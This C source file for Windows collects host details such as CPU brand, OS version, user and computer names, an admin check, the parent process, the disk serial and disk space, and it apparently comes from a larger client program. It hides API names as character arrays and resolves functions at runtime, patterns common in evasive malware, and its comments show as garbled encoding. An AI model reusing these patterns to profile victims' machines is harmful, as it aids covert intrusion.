
#include "../PublicVar.h"
#include <Windows.h>
#include <lm.h>
#include <Winternl.h>
#include "../initParams.h"


void Executecpuid(DWORD veax,DWORD * Regs)
{
#ifndef _WIN64
	DWORD deax;
	DWORD debx;
	DWORD decx;
	DWORD dedx;

	__asm
	{
		mov eax, veax ;�������������eax
			cpuid  ;ִ��cpuid
			mov deax, eax ;�������д���ѼĴ����еı���������ʱ����
			mov debx, ebx
			mov decx, ecx
			mov dedx, edx
	}

	Regs[0] = deax;
	Regs[1] = debx;
	Regs[2] = decx;
	Regs[3] = dedx;
#else
	return;
#endif
}


char * GetCPUBrand(char * strCpuBrand)
{
	char strcpu[256] = { 0 };
	DWORD Regs[4] = {0};					
	DWORD BRANDID = 0x80000002;		// ��0x80000002��ʼ����0x80000004����,�����洢�̱��ַ�����48���ַ�
	for (DWORD i = 0; i < 3; i++)	
	{
		Executecpuid(BRANDID + i,Regs);   
		lpRtlMoveMemory(strcpu + i*16, (char*)Regs, 16); 
	}     

	for (int i = 0;i < lplstrlenA(strcpu);i ++)
	{
		if (strcpu[i] != ' ')
		{
			lplstrcpyA(strCpuBrand, strcpu + i);
			break;
		}
	}
	return strCpuBrand; 
}




int GetSystemDir(char * sysdir) {
	int iRet = lpGetSystemDirectoryA(sysdir, MAX_PATH);
	return iRet;
}


int GetCpuBits()
{
	BOOL bIsWow64 = FALSE;
	//IsWow64Process is not available on all supported versions of Windows.
	//Use GetModuleHandle to get a handle to the DLL that contains the function and GetProcAddress to get a pointer to the function if available.

	char szIsWow64Process[] = {'I','s','W','o','w','6','4','P','r','o','c','e','s','s',0};
	if (lpDllKernel32 == 0)
	{
		lpDllKernel32 = (HMODULE)GetDllKernel32Base();
	}
	typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)lpGetProcAddress(lpDllKernel32,szIsWow64Process);
	if(NULL != fnIsWow64Process)
	{
		int iRet = fnIsWow64Process(lpGetCurrentProcess(),&bIsWow64);
		if (iRet)
		{
			if (bIsWow64)
			{
				return 64;
			}
		}
	}
	return 32;
}



int GetWindowsVersion(char * strSysVersion)
{
	WKSTA_INFO_100 *wkstaInfo = NULL;
	NET_API_STATUS netStatus = lpNetWkstaGetInfo(NULL, 100, (LPBYTE *)&wkstaInfo);
	if (netStatus == NERR_Success) 
	{
		DWORD dwMajVer = wkstaInfo->wki100_ver_major;
		DWORD dwMinVer = wkstaInfo->wki100_ver_minor;
		DWORD dwVersion = (DWORD)MAKELONG(dwMinVer, dwMajVer);
		netStatus = lpNetApiBufferFree(wkstaInfo);

		char strWin9x[]		= {'W','i','n','d','o','w','s',' ','9','.','x',0};
		char strWin2000[]	= {'W','i','n','d','o','w','s',' ','2','0','0','0',0};
		char strWinXP[]		= {'W','i','n','d','o','w','s',' ','X','P',0};
		char strWinVista[]	= {'W','i','n','d','o','w','s',' ','V','i','s','t','a',0};
		char strWin7[]		= {'W','i','n','d','o','w','s',' ','7',0};
		char strWin8[]		= {'W','i','n','d','o','w','s',' ','8',0};
		char strWin10[]		= {'W','i','n','d','o','w','s',' ','1','0',0};
		char strWinUnknow[] = {'U','n','k','n','o','w',0};

		iSystemVersion = 0;
		if (dwVersion < 0x50000)
		{
			lplstrcpyA(strSysVersion,strWin9x);
			iSystemVersion = SYSTEM_VERSION_WIN9X;
		}
		else if (dwVersion == 0x50000)
		{
			lplstrcpyA(strSysVersion,strWin2000);
			iSystemVersion = SYSTEM_VERSION_WIN2000;
		}
		else if (dwVersion > 0x50000 && dwVersion < 0x60000)
		{
			lplstrcpyA(strSysVersion,strWinXP);
			iSystemVersion = SYSTEM_VERSION_XP;
		}
		else if (dwVersion == 0x60000)
		{
			lplstrcpyA(strSysVersion,strWinVista);
			iSystemVersion = SYSTEM_VERSION_VISTA;
		}
		else if (dwVersion == 0x60001)
		{
			lplstrcpyA(strSysVersion,strWin7);
			iSystemVersion = SYSTEM_VERSION_WIN7;
		}
		else if (dwVersion >= 0x60002 && dwVersion <= 0x60003)
		{
			lplstrcpyA(strSysVersion,strWin8);
			iSystemVersion = SYSTEM_VERSION_WIN8;
		}
		else if (dwVersion >= 0x60003 || dwVersion == 0x100000)
		{
			lplstrcpyA(strSysVersion,strWin10);
			iSystemVersion = SYSTEM_VERSION_WIN10;
		}
		else
		{
			lplstrcpyA(strSysVersion,strWinUnknow);
			iSystemVersion = SYSTEM_VERSION_UNKNOW;
		}
		return iSystemVersion;
	}

	return FALSE;
}




int GetHostName(char *szHostName)
{
	return lpgethostname(szHostName,MAX_PATH);
}




int GetUserAndComputerName(char * strUserName,char * strComputerName)
{
	DWORD dwSize = MAX_PATH;
	int iRet = lpGetUserNameA(strUserName,&dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	char szAdmin[] = {'A','d','m','i','n','i','s','t','r','a','t','o','r',0};
	if (lplstrcmpA(strUserName,szAdmin) == 0)
	{
		iIsAdministrator = TRUE;
	}

	dwSize = MAX_PATH;
	iRet = lpGetComputerNameA(strComputerName,&dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	return TRUE;
}




__kernel_entry NTSTATUS  NTAPI lpNtQueryInformationProcess (HMODULE lpDllntdll,IN HANDLE ProcessHandle,IN PROCESSINFOCLASS ProcessInformationClass,OUT PVOID ProcessInformation,  IN ULONG ProcessInformationLength,  OUT PULONG ReturnLength OPTIONAL  )  
{  
	NTSTATUS rc = 0;  
	char szNtQueryInformationProcess[] = {'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s',0};
	typedef NTSTATUS (WINAPI *NTQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS,PVOID,ULONG,PULONG) ;  
	NTQUERYINFORMATIONPROCESS pfn = (NTQUERYINFORMATIONPROCESS) lpGetProcAddress( lpDllntdll, szNtQueryInformationProcess ) ;  
	if (pfn)  
	{
		rc = pfn (ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength) ;  
	}

	return rc ;  
} 


int GetParentProcName(char * szParentProcName)  
{  
	int result = 0;

	HANDLE hProcess = lpOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lpGetCurrentProcessId()) ;  
	if (hProcess)  
	{  
		
		LONG status = 0;  
		PROCESS_BASIC_INFORMATION pbi = {0};  
		if (lpDllntdll == NULL)
		{
			char szDllntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
			lpDllntdll = (HMODULE)lpLoadLibraryA(szDllntdll);
		}
		status = lpNtQueryInformationProcess(lpDllntdll, hProcess,ProcessBasicInformation,  (PVOID)&pbi,  sizeof(PROCESS_BASIC_INFORMATION),  NULL );  
		if (NT_SUCCESS(status))  
		{  
			DWORD dwParentPID = (UINT) pbi.Reserved3 ;
			HANDLE hParentProcess = lpOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwParentPID ) ;
			if (hParentProcess)  
			{  
				CHAR szBuf [MAX_PATH] = {0} ;  
				status = lpNtQueryInformationProcess(lpDllntdll, hParentProcess,   (PROCESSINFOCLASS) 27,  (PVOID)szBuf,  sizeof(szBuf),  NULL) ;    
				if (NT_SUCCESS(status))  
				{  
					PUNICODE_STRING lpuImageFileName = (PUNICODE_STRING)szBuf ;  

					int len = lpWideCharToMultiByte(CP_ACP, 0, lpuImageFileName->Buffer, -1, szParentProcName,MAX_PATH , NULL, NULL); 

					result = TRUE;
				}  
				lpCloseHandle(hParentProcess) ;  
			}  
		}  
		lpCloseHandle(hProcess) ;  
	} 
	return result;
}  




int GetDiskVolumeSerialNo(DWORD * lpulVolumeSerialNo){
	int iRet = lpGetVolumeInformationA(0,0,0,lpulVolumeSerialNo,0,0,0,0);
	if (iRet == 0)
	{
		WriteLittleBearLog("GetHradDiskInfo lpGetVolumeInformationA error\r\n");
		return FALSE;
	}else{
		char szShowInfo[512];
		lpwsprintfA(szShowInfo,"lpGetVolumeInformationA:%u\r\n",*lpulVolumeSerialNo);
		WriteLittleBearLog(szShowInfo);
		return TRUE;
	}
}




int GetDiskSpaceInfo(char * szBuf)
{
	int iRet = 0;

	char szpartitionspace[0x1000];
	char * szBufPtr = szpartitionspace;
	
	char strDisk[4096];
	char * strDiskPtr = strDisk;
	int iLen = lpGetLogicalDriveStringsA(4096,strDisk);

	ULARGE_INTEGER iTotalSize = { 0 };
	for(int i = 0; i < iLen / 4 ; ++i)
	{
		ULARGE_INTEGER liFreeBytesLeast;
		ULARGE_INTEGER liFreeBytesTotol;
		ULARGE_INTEGER liTotalBytes;

		int iRes = lpGetDriveTypeA(strDiskPtr);
		//����ֲ����������쳣 ����ȥ��DRIVE_REMOVABLE
		if (iRes == DRIVE_FIXED /*|| iRes == DRIVE_REMOTE || iRes == DRIVE_CDROM || iRes == DRIVE_REMOVABLE*/)		
		{
			if ( (*strDiskPtr == 'A' || *strDiskPtr == 'B' || *strDiskPtr == 'a' || *strDiskPtr == 'b') && iRes == DRIVE_REMOVABLE)
			{

			}
			else
			{
				iRet = lpGetDiskFreeSpaceExA(strDiskPtr,&liFreeBytesLeast,&liTotalBytes,&liFreeBytesTotol);
				if (iRet)
				{
					strDiskPtr[1] = 0;
					int iSize = lpwsprintfA(szBufPtr,",%s������:%I64dGB,ʣ������:%I64dGB",strDiskPtr,liTotalBytes.QuadPart/1000000000,liFreeBytesLeast.QuadPart/1000000000);
					szBufPtr += iSize;
					iTotalSize.QuadPart += liTotalBytes.QuadPart;
				}
			}
		}

		strDiskPtr += 4;
	}

	int len = lpwsprintfA(szBuf,"����������:%I64dGB%s",iTotalSize.QuadPart/1000000000,szpartitionspace);
	return TRUE;
}